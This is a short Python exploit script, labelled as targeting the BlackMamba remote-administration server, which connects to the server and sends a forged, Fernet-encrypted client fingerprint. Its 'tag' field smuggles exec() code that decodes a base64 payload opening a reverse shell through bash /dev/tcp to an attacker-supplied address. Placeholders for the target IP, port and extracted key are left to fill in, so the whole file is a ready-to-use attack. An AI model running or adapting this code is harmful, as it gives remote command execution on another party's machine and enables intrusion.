# https://github.com/loseys/BlackMamba EXPLOIT
# Copyright fern89, 2024

import socket
import base64
from cryptography.fernet import Fernet


ip = '[IP of remote server]'
port = [PORT of remote server]
ENC_KEY = '[extracted from client]'
myip = b'[IP to catch revshell]/[port to catch revshell]'

hack = base64.b64encode(b'import subprocess; subprocess.Popen(["/bin/bash","-c","(sh)0>/dev/tcp/'+myip+b'"])').decode()
client_tag = '0));exec("import"+chr(32)+"base64");exec(base64.b64decode(b"'+hack+'"))#'

s = socket.socket()
s.connect((ip, port))
fingerprint = ['system_info', f'tag:{client_tag}', 'python_version:3.11.2', 'system:Windows', 'platform:Windows10', 'version:Win10', 'processor:', 'architecture:x86_64', 'uname:Gamer', 'mac_version:00-00-00-00-00-00', 'external_ip:0.0.0.0', 'local_ip:127.0.0.1', 'status:off', 'file_path:games.py']

def crypt(msg, key):
    command = str(msg)
    command = bytes(command, encoding='utf8')
    cipher_suite = Fernet(key)
    encoded_text = cipher_suite.encrypt(command)
    return encoded_text

fingerprint = crypt(fingerprint, ENC_KEY)
s.send(str(fingerprint).encode('utf-8'))

#ON CONNECT run: exec >&0
